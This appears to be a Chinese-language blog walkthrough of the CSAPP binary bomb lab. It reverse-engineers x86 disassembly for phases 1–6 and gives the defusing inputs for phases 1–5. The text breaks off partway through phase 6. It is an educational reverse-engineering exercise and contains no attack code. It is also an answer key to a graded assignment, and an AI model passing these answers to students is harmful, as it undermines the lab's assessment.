&lt;phase_1&gt;: 8048b30: 55 push %ebp 8048b31: 89 e5 mov %esp,%ebp 8048b33: 83 ec 10 sub $0x10,%esp 8048b36: 68 04 a1 04 08 push $0x804a104 8048b3b: ff 75 08 pushl 0x8(%ebp) 8048b3e: e8 45 05 00 00 call 8049088 &lt;strings_not_equal&gt; 8048b43: 83 c4 10 add $0x10,%esp 8048b46: 85 c0 test %eax,%eax 8048b48: 74 05 je 8048b4f &lt;phase_1+0x1f&gt; 8048b4a: e8 3c 06 00 00 call 804918b &lt;explode_bomb&gt; 8048b4f: c9 leave 8048b50: c3 ret 那么phase1很简单，我们看到调用了&lt;strings_not_equal&gt;函数，理性分析是个判断字符串是否相等的函数。哪两个字符串呢，我们注意到push了两个参数进去，分别是$0x804a104和0x8(%ebp)，那么0x8(%ebp)中的内容便是我们输入的结果，$0x804a104便是原本字符串的地址，查看即可 查看内存操作：x/s 0x804a104 如果我们查看0x8(%ebp)的内容，会惊喜的发现就是我们输入的内容 那么答案呼之欲出了 I turned the moon into something I call a Death Star. phase_212345678910111213141516171819202122232425262728293031323334353608048b51 &lt;phase_2&gt;: 8048b51: 55 push %ebp 8048b52: 89 e5 mov %esp,%ebp 8048b54: 56 push %esi 8048b55: 53 push %ebx 8048b56: 83 ec 28 sub $0x28,%esp 8048b59: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048b5f: 89 45 f4 mov %eax,-0xc(%ebp) 8048b62: 31 c0 xor %eax,%eax 8048b64: 8d 45 dc lea -0x24(%ebp),%eax 8048b67: 50 push %eax 8048b68: ff 75 08 pushl 0x8(%ebp) 8048b6b: e8 43 06 00 00 call 80491b3 &lt;read_six_numbers&gt; 8048b70: 83 c4 10 add $0x10,%esp 8048b73: 83 7d dc 01 cmpl $0x1,-0x24(%ebp) 8048b77: 74 05 je 8048b7e &lt;phase_2+0x2d&gt; 8048b79: e8 0d 06 00 00 call 804918b &lt;explode_bomb&gt; 8048b7e: 8d 5d dc lea -0x24(%ebp),%ebx 8048b81: 8d 75 f0 lea -0x10(%ebp),%esi 8048b84: 8b 03 mov (%ebx),%eax 8048b86: 01 c0 add %eax,%eax 8048b88: 39 43 04 cmp %eax,0x4(%ebx) 8048b8b: 74 05 je 8048b92 &lt;phase_2+0x41&gt; 8048b8d: e8 f9 05 00 00 call 804918b &lt;explode_bomb&gt; 8048b92: 83 c3 04 add $0x4,%ebx 8048b95: 39 f3 cmp %esi,%ebx 8048b97: 75 eb jne 8048b84 &lt;phase_2+0x33&gt; 8048b99: 8b 45 f4 mov -0xc(%ebp),%eax 8048b9c: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048ba3: 74 05 je 8048baa &lt;phase_2+0x59&gt; 8048ba5: e8 e6 fb ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 8048baa: 8d 65 f8 lea -0x8(%ebp),%esp 8048bad: 5b pop %ebx 8048bae: 5e pop %esi 8048baf: 5d pop %ebp 8048bb0: c3 ret 很明显看到一个&lt;read_six_numbers&gt;，如果你学过幼儿园英文，你可能会觉得他要读6个数，事实上也是这样的，我们来看&lt;read_six_numbers&gt;的函数实现 12345678910111213141516171819202122232425080491b3 &lt;read_six_numbers&gt;: 80491b3: 55 push %ebp 80491b4: 89 e5 mov %esp,%ebp 80491b6: 83 ec 08 sub $0x8,%esp 80491b9: 8b 45 0c mov 0xc(%ebp),%eax 80491bc: 8d 50 14 lea 0x14(%eax),%edx 80491bf: 52 push %edx 80491c0: 8d 50 10 lea 0x10(%eax),%edx 80491c3: 52 push %edx 80491c4: 8d 50 0c lea 0xc(%eax),%edx 80491c7: 52 push %edx 80491c8: 8d 50 08 lea 0x8(%eax),%edx 80491cb: 52 push %edx 80491cc: 8d 50 04 lea 0x4(%eax),%edx 80491cf: 52 push %edx 80491d0: 50 push %eax 80491d1: 68 e3 a2 04 08 push $0x804a2e3 80491d6: ff 75 08 pushl 0x8(%ebp) 80491d9: e8 32 f6 ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 80491de: 83 c4 20 add $0x20,%esp 80491e1: 83 f8 05 cmp $0x5,%eax 80491e4: 7f 05 jg 80491eb &lt;read_six_numbers+0x38&gt; 80491e6: e8 a0 ff ff ff call 804918b &lt;explode_bomb&gt; 80491eb: c9 leave 80491ec: c3 ret 注意到$0x804a2e3地址存放了这个函数读入功能的格式&quot;%d %d %d %d %d %d&quot; 学过C语言便知，输入的是6个整型 因此我们输入6个测试数据，越奇怪越好，查看寄存器的时候就能轻易辨识出是输入的哪一个数据 接着我们从第一个cmp开始分析 1238048b73: 83 7d dc 01 cmpl $0x1,-0x24(%ebp)8048b77: 74 05 je 8048b7e &lt;phase_2+0x2d&gt;8048b79: e8 0d 06 00 00 call 804918b &lt;explode_bomb&gt; je为相等跳转，否则就会接着执行下一条语句然后爆炸，所以这里意图很明显，要求-0x24(%ebp)的值等于0x1，那么这个-0x24(%ebp)里面是什么东西呢？我们输出看一下 因为前面数字取得好，所以这里很明显发现这是第一个输入的数字，所以就是要求第一个数字等于0x1也就是1，接着更改测试数据 这次执行后-0x24(%ebp)的值与0x1相等，因此不会爆炸，接着执行之后的语句 12345678048b7e: 8d 5d dc lea -0x24(%ebp),%ebx8048b81: 8d 75 f0 lea -0x10(%ebp),%esi8048b84: 8b 03 mov (%ebx),%eax8048b86: 01 c0 add %eax,%eax8048b88: 39 43 04 cmp %eax,0x4(%ebx)8048b8b: 74 05 je 8048b92 &lt;phase_2+0x41&gt;8048b8d: e8 f9 05 00 00 call 804918b &lt;explode_bomb&gt; 发现分别向ebx和esi内传了-0x24(%ebp) 和-0x10(%ebp)，我们前面知道-0x24(%ebp) 是1，那么我们来看看-0x10(%ebp)里面是啥 是66既我们最后一个输入的数，接着 mov (%ebx),%eax 把1给了%eax，再让%eax自加，自加后%eax的值与0x4(%ebx)比较，不相等则爆炸，我们再来看0x4(%ebx)里面是啥 发现是我们输入的第二个数据，我们知道%eax自加的结果是2，那么就是要求第二个输入的数据是2，如果相同，则跳转到&lt;phase_2+0x41&gt;，否则爆炸，我们更改输入数据，接着测试 1238048b92: 83 c3 04 add $0x4,%ebx8048b95: 39 f3 cmp %esi,%ebx8048b97: 75 eb jne 8048b84 &lt;phase_2+0x33&gt; 刚才没爆炸于是跳转到这里，我们看到给%ebx地址+4，此时%ebx值为2，比较%esi(66)与%ebx(2)的大小，如果不相等则跳回上一个句段，如果相等则向下执行，我们知道上一个句段的作用是把读进来数自加然后与下一个数比较，要求相等，我们已知第1个数为1，那么要求第2个数为1+1 = 2，第三个数2+2 = 4，以此类推，答案应该是 1 2 4 8 16 32(%esi) 当满足%esi = %ebx时，向下执行，结束phase_2 phase_3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828308048bb1 &lt;phase_3&gt;: 8048bb1: 55 push %ebp 8048bb2: 89 e5 mov %esp,%ebp 8048bb4: 83 ec 24 sub $0x24,%esp 8048bb7: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048bbd: 89 45 f4 mov %eax,-0xc(%ebp) 8048bc0: 31 c0 xor %eax,%eax 8048bc2: 8d 45 f0 lea -0x10(%ebp),%eax 8048bc5: 50 push %eax 8048bc6: 8d 45 eb lea -0x15(%ebp),%eax 8048bc9: 50 push %eax 8048bca: 8d 45 ec lea -0x14(%ebp),%eax 8048bcd: 50 push %eax 8048bce: 68 62 a1 04 08 push $0x804a162 8048bd3: ff 75 08 pushl 0x8(%ebp) 8048bd6: e8 35 fc ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048bdb: 83 c4 20 add $0x20,%esp 8048bde: 83 f8 02 cmp $0x2,%eax 8048be1: 7f 05 jg 8048be8 &lt;phase_3+0x37&gt; 8048be3: e8 a3 05 00 00 call 804918b &lt;explode_bomb&gt; 8048be8: 83 7d ec 07 cmpl $0x7,-0x14(%ebp) 8048bec: 0f 87 e9 00 00 00 ja 8048cdb &lt;phase_3+0x12a&gt; 8048bf2: 8b 45 ec mov -0x14(%ebp),%eax 8048bf5: ff 24 85 80 a1 04 08 jmp *0x804a180(,%eax,4) 8048bfc: b8 79 00 00 00 mov $0x79,%eax 8048c01: 81 7d f0 48 03 00 00 cmpl $0x348,-0x10(%ebp) 8048c08: 0f 84 d7 00 00 00 je 8048ce5 &lt;phase_3+0x134&gt; 8048c0e: e8 78 05 00 00 call 804918b &lt;explode_bomb&gt; 8048c13: b8 79 00 00 00 mov $0x79,%eax 8048c18: e9 c8 00 00 00 jmp 8048ce5 &lt;phase_3+0x134&gt; 8048c1d: b8 64 00 00 00 mov $0x64,%eax 8048c22: 81 7d f0 a4 01 00 00 cmpl $0x1a4,-0x10(%ebp) 8048c29: 0f 84 b6 00 00 00 je 8048ce5 &lt;phase_3+0x134&gt; 8048c2f: e8 57 05 00 00 call 804918b &lt;explode_bomb&gt; 8048c34: b8 64 00 00 00 mov $0x64,%eax 8048c39: e9 a7 00 00 00 jmp 8048ce5 &lt;phase_3+0x134&gt; 8048c3e: b8 70 00 00 00 mov $0x70,%eax 8048c43: 83 7d f0 46 cmpl $0x46,-0x10(%ebp) 8048c47: 0f 84 98 00 00 00 je 8048ce5 &lt;phase_3+0x134&gt; 8048c4d: e8 39 05 00 00 call 804918b &lt;explode_bomb&gt; 8048c52: b8 70 00 00 00 mov $0x70,%eax 8048c57: e9 89 00 00 00 jmp 8048ce5 &lt;phase_3+0x134&gt; 8048c5c: b8 7a 00 00 00 mov $0x7a,%eax 8048c61: 81 7d f0 c4 02 00 00 cmpl $0x2c4,-0x10(%ebp) 8048c68: 74 7b je 8048ce5 &lt;phase_3+0x134&gt; 8048c6a: e8 1c 05 00 00 call 804918b &lt;explode_bomb&gt; 8048c6f: b8 7a 00 00 00 mov $0x7a,%eax 8048c74: eb 6f jmp 8048ce5 &lt;phase_3+0x134&gt; 8048c76: b8 6b 00 00 00 mov $0x6b,%eax 8048c7b: 83 7d f0 68 cmpl $0x68,-0x10(%ebp) 8048c7f: 74 64 je 8048ce5 &lt;phase_3+0x134&gt; 8048c81: e8 05 05 00 00 call 804918b &lt;explode_bomb&gt; 8048c86: b8 6b 00 00 00 mov $0x6b,%eax 8048c8b: eb 58 jmp 8048ce5 &lt;phase_3+0x134&gt; 8048c8d: b8 72 00 00 00 mov $0x72,%eax 8048c92: 81 7d f0 a1 01 00 00 cmpl $0x1a1,-0x10(%ebp) 8048c99: 74 4a je 8048ce5 &lt;phase_3+0x134&gt; 8048c9b: e8 eb 04 00 00 call 804918b &lt;explode_bomb&gt; 8048ca0: b8 72 00 00 00 mov $0x72,%eax 8048ca5: eb 3e jmp 8048ce5 &lt;phase_3+0x134&gt; 8048ca7: b8 72 00 00 00 mov $0x72,%eax 8048cac: 81 7d f0 80 00 00 00 cmpl $0x80,-0x10(%ebp) 8048cb3: 74 30 je 8048ce5 &lt;phase_3+0x134&gt; 8048cb5: e8 d1 04 00 00 call 804918b &lt;explode_bomb&gt; 8048cba: b8 72 00 00 00 mov $0x72,%eax 8048cbf: eb 24 jmp 8048ce5 &lt;phase_3+0x134&gt; 8048cc1: b8 72 00 00 00 mov $0x72,%eax 8048cc6: 81 7d f0 84 00 00 00 cmpl $0x84,-0x10(%ebp) 8048ccd: 74 16 je 8048ce5 &lt;phase_3+0x134&gt; 8048ccf: e8 b7 04 00 00 call 804918b &lt;explode_bomb&gt; 8048cd4: b8 72 00 00 00 mov $0x72,%eax 8048cd9: eb 0a jmp 8048ce5 &lt;phase_3+0x134&gt; 8048cdb: e8 ab 04 00 00 call 804918b &lt;explode_bomb&gt; 8048ce0: b8 72 00 00 00 mov $0x72,%eax 8048ce5: 3a 45 eb cmp -0x15(%ebp),%al 8048ce8: 74 05 je 8048cef &lt;phase_3+0x13e&gt; 8048cea: e8 9c 04 00 00 call 804918b &lt;explode_bomb&gt; 8048cef: 8b 45 f4 mov -0xc(%ebp),%eax 8048cf2: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048cf9: 74 05 je 8048d00 &lt;phase_3+0x14f&gt; 8048cfb: e8 90 fa ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 8048d00: c9 leave 8048d01: c3 ret 观察到没有用到什么奇特的函数，我们先来看一下输入 1234567898048bc2: 8d 45 f0 lea -0x10(%ebp),%eax8048bc5: 50 push %eax8048bc6: 8d 45 eb lea -0x15(%ebp),%eax8048bc9: 50 push %eax8048bca: 8d 45 ec lea -0x14(%ebp),%eax8048bcd: 50 push %eax8048bce: 68 62 a1 04 08 push $0x804a1628048bd3: ff 75 08 pushl 0x8(%ebp)8048bd6: e8 35 fc ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; push了三个参数进去，格式很有可能放在0x804a162里，我们check一下 显然，这次让我们输入三个数，两个整型，一个字符型 那么我们就继续搞我们的 sepcial input 123458048bd6: e8 35 fc ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt;8048bdb: 83 c4 20 add $0x20,%esp8048bde: 83 f8 02 cmp $0x2,%eax8048be1: 7f 05 jg 8048be8 &lt;phase_3+0x37&gt;8048be3: e8 a3 05 00 00 call 804918b &lt;explode_bomb&gt; 获取了输入以后，我们看到有个cmp，这里是检查输入格式是否正确，当%eax &gt; 0x2时跳转，否则爆炸 128048be8: 83 7d ec 07 cmpl $0x7,-0x14(%ebp)8048bec: 0f 87 e9 00 00 00 ja 8048cdb &lt;phase_3+0x12a&gt; 向下执行，这里比较-0x14(%ebp)与0x7的大小，根据前面的push顺序，我们知道-0x14(%ebp)是我们的第一个输入，如果-0x14(%ebp) &gt; 0x7就跳转到&lt;phase_3+0x12a&gt;，&lt;phase_3+0x12a&gt;时引爆函数，所以这里要求我们第一个输入&lt;= 7，那我们就以7为例，更新测试数据 128048bf2: 8b 45 ec mov -0x14(%ebp),%eax8048bf5: ff 24 85 80 a1 04 08 jmp *0x804a180(,%eax,4) 继续执行，将第一个输入的值给了%eax，然后无条件跳转到0x804a180(,%eax,4)，跟踪程序，发现跳转到了 12348048cc1: b8 72 00 00 00 mov $0x72,%eax8048cc6: 81 7d f0 84 00 00 00 cmpl $0x84,-0x10(%ebp)8048ccd: 74 16 je 8048ce5 &lt;phase_3+0x134&gt;8048ccf: e8 b7 04 00 00 call 804918b &lt;explode_bomb&gt; 这里比较了0x84与-0x10(%ebp)，其中-0x10(%ebp)是我们第三个输入的数据99，要求-0x10(%ebp) = 0x84，否则爆炸，也就是说我们第三个输入的数据必须为132，更新测试数据，继续运行程序 1238048ce5: 3a 45 eb cmp -0x15(%ebp),%al8048ce8: 74 05 je 8048cef &lt;phase_3+0x13e&gt;8048cea: e8 9c 04 00 00 call 804918b &lt;explode_bomb&gt; 终于看到我们输入的第二个数据(字符型)了，这里它和%al比大小，我们来看一下%al的值 %al是16进制的72字符，我们查找ASCII码表 发现%al为r，因此我们第二位输入的数据也应为r 因此phase_3的一个答案 7 r 132 phase_41234567891011121314151617181920212223242526272829303132333435363708048d5e &lt;phase_4&gt;: 8048d5e: 55 push %ebp 8048d5f: 89 e5 mov %esp,%ebp 8048d61: 83 ec 18 sub $0x18,%esp 8048d64: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048d6a: 89 45 f4 mov %eax,-0xc(%ebp) 8048d6d: 31 c0 xor %eax,%eax 8048d6f: 8d 45 f0 lea -0x10(%ebp),%eax 8048d72: 50 push %eax 8048d73: 8d 45 ec lea -0x14(%ebp),%eax 8048d76: 50 push %eax 8048d77: 68 ef a2 04 08 push $0x804a2ef 8048d7c: ff 75 08 pushl 0x8(%ebp) 8048d7f: e8 8c fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048d84: 83 c4 10 add $0x10,%esp 8048d87: 83 f8 02 cmp $0x2,%eax 8048d8a: 75 06 jne 8048d92 &lt;phase_4+0x34&gt; 8048d8c: 83 7d ec 0e cmpl $0xe,-0x14(%ebp) 8048d90: 76 05 jbe 8048d97 &lt;phase_4+0x39&gt; 8048d92: e8 f4 03 00 00 call 804918b &lt;explode_bomb&gt; 8048d97: 83 ec 04 sub $0x4,%esp 8048d9a: 6a 0e push $0xe 8048d9c: 6a 00 push $0x0 8048d9e: ff 75 ec pushl -0x14(%ebp) 8048da1: e8 5c ff ff ff call 8048d02 &lt;func4&gt; 8048da6: 83 c4 10 add $0x10,%esp 8048da9: 83 f8 07 cmp $0x7,%eax 8048dac: 75 06 jne 8048db4 &lt;phase_4+0x56&gt; 8048dae: 83 7d f0 07 cmpl $0x7,-0x10(%ebp) 8048db2: 74 05 je 8048db9 &lt;phase_4+0x5b&gt; 8048db4: e8 d2 03 00 00 call 804918b &lt;explode_bomb&gt; 8048db9: 8b 45 f4 mov -0xc(%ebp),%eax 8048dbc: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048dc3: 74 05 je 8048dca &lt;phase_4+0x6c&gt; 8048dc5: e8 c6 f9 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 8048dca: c9 leave 8048dcb: c3 ret 与phase_3类似，我们先来检查输入 12345678048d6f: 8d 45 f0 lea -0x10(%ebp),%eax8048d72: 50 push %eax8048d73: 8d 45 ec lea -0x14(%ebp),%eax8048d76: 50 push %eax8048d77: 68 ef a2 04 08 push $0x804a2ef8048d7c: ff 75 08 pushl 0x8(%ebp)8048d7f: e8 8c fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; push两个参数，查看一下格式 那就是输入两个整型，继续搞特殊化 69是十分好的数字 1234567891011128048d7f: e8 8c fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt;8048d84: 83 c4 10 add $0x10,%esp8048d87: 83 f8 02 cmp $0x2,%eax8048d8a: 75 06 jne 8048d92 &lt;phase_4+0x34&gt;8048d8c: 83 7d ec 0e cmpl $0xe,-0x14(%ebp)8048d90: 76 05 jbe 8048d97 &lt;phase_4+0x39&gt;8048d92: e8 f4 03 00 00 call 804918b &lt;explode_bomb&gt;8048d97: 83 ec 04 sub $0x4,%esp8048d9a: 6a 0e push $0xe8048d9c: 6a 00 push $0x08048d9e: ff 75 ec pushl -0x14(%ebp)8048da1: e8 5c ff ff ff call 8048d02 &lt;func4&gt; 与phase_3类似，第一个cmp是检查格式，第二个cmp要求-0x14(%ebp) &lt;= 0xe，就是第一个输入&lt;= 14，那我们就以6为例，执行到8048d9a时发现向栈中push了3个数，分别是0xe、0x0、-0x14(%ebp)，接着调用了&lt;func4&gt;，至于这个&lt;func4&gt;是什么牛鬼蛇神，我们来看函数定义 12345678910111213141516171819202122232425262728293031323334353637383940414208048d02 &lt;func4&gt;: 8048d02: 55 push %ebp 8048d03: 89 e5 mov %esp,%ebp 8048d05: 56 push %esi 8048d06: 53 push %ebx 8048d07: 8b 4d 08 mov 0x8(%ebp),%ecx 8048d0a: 8b 5d 0c mov 0xc(%ebp),%ebx 8048d0d: 8b 75 10 mov 0x10(%ebp),%esi 8048d10: 89 f0 mov %esi,%eax 8048d12: 29 d8 sub %ebx,%eax 8048d14: 89 c2 mov %eax,%edx 8048d16: c1 ea 1f shr $0x1f,%edx 8048d19: 01 d0 add %edx,%eax 8048d1b: d1 f8 sar %eax 8048d1d: 8d 14 18 lea (%eax,%ebx,1),%edx 8048d20: 39 ca cmp %ecx,%edx 8048d22: 7e 15 jle 8048d39 &lt;func4+0x37&gt; 8048d24: 83 ec 04 sub $0x4,%esp 8048d27: 83 ea 01 sub $0x1,%edx 8048d2a: 52 push %edx 8048d2b: 53 push %ebx 8048d2c: 51 push %ecx 8048d2d: e8 d0 ff ff ff call 8048d02 &lt;func4&gt; 8048d32: 83 c4 10 add $0x10,%esp 8048d35: 01 c0 add %eax,%eax 8048d37: eb 1e jmp 8048d57 &lt;func4+0x55&gt; 8048d39: b8 00 00 00 00 mov $0x0,%eax 8048d3e: 39 ca cmp %ecx,%edx 8048d40: 7d 15 jge 8048d57 &lt;func4+0x55&gt; 8048d42: 83 ec 04 sub $0x4,%esp 8048d45: 56 push %esi 8048d46: 83 c2 01 add $0x1,%edx 8048d49: 52 push %edx 8048d4a: 51 push %ecx 8048d4b: e8 b2 ff ff ff call 8048d02 &lt;func4&gt; 8048d50: 83 c4 10 add $0x10,%esp 8048d53: 8d 44 00 01 lea 0x1(%eax,%eax,1),%eax 8048d57: 8d 65 f8 lea -0x8(%ebp),%esp 8048d5a: 5b pop %ebx 8048d5b: 5e pop %esi 8048d5c: 5d pop %ebp 8048d5d: c3 ret 根据我三四个小时没日没夜的分析，这个函数我没看懂，不过我们可以把它用高级语言写一遍 12345678910111213141516171819202122232425//fun4的c版本void fun4(int ecx, int ebx, int esi){ eax = esi; eax -= ebx; edx = eax; edx &gt;&gt;= 31; eax = edx + eax; eax /= 2; edx = eax + ebx; if(edx &lt;= ecx){ eax = 0; if(edx &gt;= ecx){ return; } edx++; fun4(ecx, edx, esi); eax = 1 + eax*2; return; } edx--; fun4(ecx, ebx, edx); eax *= 2; return;} 就算翻译成高级语言，还是说不上这个函数是个啥意思，不过它里面有多处递归，我们先往下分析汇编程序 12348048da1: e8 5c ff ff ff call 8048d02 &lt;func4&gt;8048da6: 83 c4 10 add $0x10,%esp8048da9: 83 f8 07 cmp $0x7,%eax8048dac: 75 06 jne 8048db4 &lt;phase_4+0x56&gt; 注意到调用&lt;func4&gt;后，程序比较了%eax和0x7的值，说明%eax不为0x7就爆炸，那么输入数据是几%eax会变成0x7呢 我们可以遍历0~14，输出调用&lt;func4&gt;后的结果 因此我们可以知道，当第一个输入的数据-0x14(%ebp) 为14时，我们可以得到%eax = 7 1238048dae: 83 7d f0 07 cmpl $0x7,-0x10(%ebp)8048db2: 74 05 je 8048db9 &lt;phase_4+0x5b&gt;8048db4: e8 d2 03 00 00 call 804918b &lt;explode_bomb&gt; 确认第一个输入为14后，分析紧接着的汇编程序，发现要求-0x10(%ebp)为0x7，一石二鸟，我们现在知道了phase_4的完整答案 14 7 phase_512345678910111213141516171819202122232425262728293031323334353637383940414208048dcc &lt;phase_5&gt;: 8048dcc: 55 push %ebp 8048dcd: 89 e5 mov %esp,%ebp 8048dcf: 83 ec 18 sub $0x18,%esp 8048dd2: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048dd8: 89 45 f4 mov %eax,-0xc(%ebp) 8048ddb: 31 c0 xor %eax,%eax 8048ddd: 8d 45 f0 lea -0x10(%ebp),%eax 8048de0: 50 push %eax 8048de1: 8d 45 ec lea -0x14(%ebp),%eax 8048de4: 50 push %eax 8048de5: 68 ef a2 04 08 push $0x804a2ef 8048dea: ff 75 08 pushl 0x8(%ebp) 8048ded: e8 1e fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048df2: 83 c4 10 add $0x10,%esp 8048df5: 83 f8 01 cmp $0x1,%eax 8048df8: 7f 05 jg 8048dff &lt;phase_5+0x33&gt; 8048dfa: e8 8c 03 00 00 call 804918b &lt;explode_bomb&gt; 8048dff: 8b 45 ec mov -0x14(%ebp),%eax 8048e02: 83 e0 0f and $0xf,%eax 8048e05: 89 45 ec mov %eax,-0x14(%ebp) 8048e08: 83 f8 0f cmp $0xf,%eax 8048e0b: 74 2c je 8048e39 &lt;phase_5+0x6d&gt; 8048e0d: b9 00 00 00 00 mov $0x0,%ecx 8048e12: ba 00 00 00 00 mov $0x0,%edx 8048e17: 83 c2 01 add $0x1,%edx 8048e1a: 8b 04 85 a0 a1 04 08 mov 0x804a1a0(,%eax,4),%eax 8048e21: 01 c1 add %eax,%ecx 8048e23: 83 f8 0f cmp $0xf,%eax 8048e26: 75 ef jne 8048e17 &lt;phase_5+0x4b&gt; 8048e28: c7 45 ec 0f 00 00 00 movl $0xf,-0x14(%ebp) 8048e2f: 83 fa 0f cmp $0xf,%edx 8048e32: 75 05 jne 8048e39 &lt;phase_5+0x6d&gt; 8048e34: 3b 4d f0 cmp -0x10(%ebp),%ecx 8048e37: 74 05 je 8048e3e &lt;phase_5+0x72&gt; 8048e39: e8 4d 03 00 00 call 804918b &lt;explode_bomb&gt; 8048e3e: 8b 45 f4 mov -0xc(%ebp),%eax 8048e41: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048e48: 74 05 je 8048e4f &lt;phase_5+0x83&gt; 8048e4a: e8 41 f9 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 8048e4f: c9 leave 8048e50: c3 ret 按照流程，先检查输入 12345678910118048ddd: 8d 45 f0 lea -0x10(%ebp),%eax8048de0: 50 push %eax8048de1: 8d 45 ec lea -0x14(%ebp),%eax8048de4: 50 push %eax8048de5: 68 ef a2 04 08 push $0x804a2ef8048dea: ff 75 08 pushl 0x8(%ebp)8048ded: e8 1e fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt;8048df2: 83 c4 10 add $0x10,%esp8048df5: 83 f8 01 cmp $0x1,%eax8048df8: 7f 05 jg 8048dff &lt;phase_5+0x33&gt;8048dfa: e8 8c 03 00 00 call 804918b &lt;explode_bomb&gt; 经过之前的phase_3和phase_4，这里我们已经很熟悉了，输入两个数据-0x10(%ebp)和-0x14(%ebp)，0x804a2ef是输入格式，%eax用于检查格式，格式不正确就爆炸 依然是2个整型，输入66、99继续执行 123458048dff: 8b 45 ec mov -0x14(%ebp),%eax8048e02: 83 e0 0f and $0xf,%eax8048e05: 89 45 ec mov %eax,-0x14(%ebp)8048e08: 83 f8 0f cmp $0xf,%eax8048e0b: 74 2c je 8048e39 &lt;phase_5+0x6d&gt; 注意到第一个对%eax的要求是其不能等于0xf，否则就跳转&lt;phase_5+0x6d&gt;爆炸，%eax就是我们第一个输入的数据-0x14(%ebp)，在mov指令之后，对%eax进行了与0xf的and运算，我们都知道0xf就是二进制的1111，0xf与%eax与运算，则说明不论输入数据值为多少，都只取最后4位，因此%eax范围就是0~15，又不能等于15，于是范围0~14 123456789101112138048e0d: b9 00 00 00 00 mov $0x0,%ecx8048e12: ba 00 00 00 00 mov $0x0,%edx8048e17: 83 c2 01 add $0x1,%edx8048e1a: 8b 04 85 a0 a1 04 08 mov 0x804a1a0(,%eax,4),%eax8048e21: 01 c1 add %eax,%ecx8048e23: 83 f8 0f cmp $0xf,%eax8048e26: 75 ef jne 8048e17 &lt;phase_5+0x4b&gt;8048e28: c7 45 ec 0f 00 00 00 movl $0xf,-0x14(%ebp)8048e2f: 83 fa 0f cmp $0xf,%edx8048e32: 75 05 jne 8048e39 &lt;phase_5+0x6d&gt;8048e34: 3b 4d f0 cmp -0x10(%ebp),%ecx8048e37: 74 05 je 8048e3e &lt;phase_5+0x72&gt;8048e39: e8 4d 03 00 00 call 804918b &lt;explode_bomb&gt; 这一句段是phase_5的核心，一开始%ecx、%edx初始化为0，0x804a1a0处是一个类似于数组的结构，具体的对应索引我们不清楚 总之就是一顿操作后把结果给%eax，再%eax + %ecx，分析后面的程序我们可以知道，这个%ecx是储存每一个循环的%eax累计之和，就是一个累加器，%edx是循环计数器，每循环一次就+1，然后我们看到要比较%eax和0xf的值，意思是%eax不是15就重新开始循环，我们便知最后一步中%eax的值为15，通过检查之后，要求%edx为15，所以我们要进行15次循环，循环结束后再次比较%ecx与-0x10(%ebp)，-0x10(%ebp)是我们第二个输入的数据，%ecx是累加之和，因此这段程序我们明了了，第一个输入的数据是数组的第一个数，只要它不是数组的最后一个数15，就指向数组的下一个数，%edx计数器+1，循环15次，统计累加之和，和就是第二个输入的数，这里我们可以激动地从0到14遍历看相互之间的顺序，机智如我看清了这个数组的真面目，其实他是一个链表 5-&gt;12-&gt;3-&gt;7-&gt;11-&gt;13-&gt;9-&gt;4-&gt;8-&gt;0-&gt;1-&gt;2-&gt;14-&gt;6-&gt;15 因此我们晓得，从链表的第一个数开始，就可以循环15次，到链表结尾15，第一个输入的数便是链表的开头5，第二个数便是链表的数之和115 因此phase_5答案 5 115 phase_612345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777808048e51 &lt;phase_6&gt;: 8048e51: 55 push %ebp 8048e52: 89 e5 mov %esp,%ebp 8048e54: 56 push %esi 8048e55: 53 push %ebx 8048e56: 83 ec 48 sub $0x48,%esp 8048e59: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048e5f: 89 45 f4 mov %eax,-0xc(%ebp) 8048e62: 31 c0 xor %eax,%eax 8048e64: 8d 45 c4 lea -0x3c(%ebp),%eax 8048e67: 50 push %eax 8048e68: ff 75 08 pushl 0x8(%ebp) 8048e6b: e8 43 03 00 00 call 80491b3 &lt;read_six_numbers&gt; 8048e70: 83 c4 10 add $0x10,%esp 8048e73: be 00 00 00 00 mov $0x0,%esi 8048e78: 8b 44 b5 c4 mov -0x3c(%ebp,%esi,4),%eax 8048e7c: 83 e8 01 sub $0x1,%eax 8048e7f: 83 f8 05 cmp $0x5,%eax 8048e82: 76 05 jbe 8048e89 &lt;phase_6+0x38&gt; 8048e84: e8 02 03 00 00 call 804918b &lt;explode_bomb&gt; 8048e89: 83 c6 01 add $0x1,%esi 8048e8c: 83 fe 06 cmp $0x6,%esi 8048e8f: 74 33 je 8048ec4 &lt;phase_6+0x73&gt; 8048e91: 89 f3 mov %esi,%ebx 8048e93: 8b 44 9d c4 mov -0x3c(%ebp,%ebx,4),%eax 8048e97: 39 44 b5 c0 cmp %eax,-0x40(%ebp,%esi,4) 8048e9b: 75 05 jne 8048ea2 &lt;phase_6+0x51&gt; 8048e9d: e8 e9 02 00 00 call 804918b &lt;explode_bomb&gt; 8048ea2: 83 c3 01 add $0x1,%ebx 8048ea5: 83 fb 05 cmp $0x5,%ebx 8048ea8: 7e e9 jle 8048e93 &lt;phase_6+0x42&gt; 8048eaa: eb cc jmp 8048e78 &lt;phase_6+0x27&gt; 8048eac: 8b 52 08 mov 0x8(%edx),%edx 8048eaf: 83 c0 01 add $0x1,%eax 8048eb2: 39 c8 cmp 